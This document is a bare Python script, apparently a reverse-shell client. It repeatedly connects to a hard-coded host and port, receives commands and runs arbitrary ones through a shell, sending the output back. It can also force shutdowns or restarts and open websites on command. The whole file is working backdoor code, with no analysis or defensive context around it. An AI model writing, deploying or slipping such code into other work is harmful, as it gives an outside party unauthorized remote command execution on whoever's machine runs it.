import socket
import os
import subprocess
import time
import webbrowser as wb

s = socket.socket()
while True:
    try:
        HOST = "192.168.0.141"
        PORT = 8000

        s.connect((HOST, PORT))
        break
    except Exception as e:
        print("Connection Problem With Server")
        print(e)
        time.sleep(3)
    

while True:
    try:
        cmd = s.recv(5000)

        if not cmd:
            continue

        cmd = cmd.decode()

        print(f"command : {cmd}")

        if cmd == "systeminfo":
            msg = "linux"
            s.send(msg.encode())

        elif cmd == "exit":
            print("Connection Disconnecting")
            break

        elif cmd == "shutdown":
            os.system("shutdown -s -f -t 0")

        elif cmd == "restart":
            os.system("shutdown -r -f -t 0")

        elif cmd.startswith("open "):
            try:

                app = cmd.replace("open ", "").strip()
            #os.system("Taskkill /IM chrome.exe /F")
            #os.system("Taskkill /IM msedge.exe /F")
            #os.system("Taskkill /IM firefox.exe /F")
                wb.open(f"https://{app}.com")        

                s.send(f"{app} opened".encode())   # 🔥 add this
            except:
                s.send("wrong domain name".encode()) 

        else:
            try:
                syscmd = subprocess.check_output(cmd, shell=True)

                sysmsg = syscmd.decode()

                s.send(sysmsg.encode())

            except Exception as p:
                error = str(p)

                s.send(error.encode())

    except Exception as f:
        s.send("task complete".encode())
        print("Connection Stopped")
        print(f"Error : {f}")
        break